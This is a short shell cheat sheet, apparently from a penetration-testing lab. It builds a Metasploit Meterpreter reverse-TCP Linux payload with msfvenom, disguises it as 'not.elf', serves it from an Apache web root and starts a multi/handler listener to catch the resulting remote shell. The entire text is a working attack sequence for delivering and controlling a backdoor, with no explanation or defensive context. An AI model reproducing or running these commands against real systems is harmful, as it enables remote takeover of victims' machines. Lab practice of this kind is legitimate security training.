sudo apt update
sudo apt upgrade

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attackers ip> LPORT=9001 -f elf -o not.elf

sudo cp not.elf /var/www/html/

service apache2 start

service apache2 status 

msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost <attackers ip>; set lport 9001; exploit"

echo"type help to get list of commands"
